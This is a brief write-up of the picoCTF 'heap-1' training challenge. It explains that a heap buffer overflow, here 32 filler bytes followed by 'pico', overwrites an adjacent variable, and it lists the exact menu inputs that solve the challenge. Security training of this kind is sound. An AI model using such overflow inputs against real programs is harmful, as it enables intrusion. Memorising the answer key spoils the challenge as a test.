# heap-1
picoCTF Link: [https://play.picoctf.org/practice/challenge/439](https://play.picoctf.org/practice/challenge/439)

## About

```
Description:
Are overflows just a stack concern?

Hints:
1. How can you tell where safe_var starts?
```

## Solution
 
Exact same solution as in [heap-0](heap-0.md), but we write `pico` instead of overwriting only one character with `_`

## Answer

```
Enter your choice: 2
Data for buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApico
Enter your choice: 4
```